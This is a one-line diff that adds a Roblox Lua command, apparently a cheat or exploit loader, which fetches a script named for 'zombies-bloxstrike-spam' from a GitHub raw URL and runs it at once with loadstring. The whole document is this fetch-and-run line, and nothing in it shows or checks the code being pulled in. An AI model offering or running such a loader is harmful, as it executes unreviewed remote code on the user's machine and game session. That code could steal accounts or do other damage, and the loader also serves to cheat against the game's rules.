@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Unitetrumake/loaders/main/loaders/zombies-bloxstrike-spam3-ry02wwb8gmhv9z.lua"))()
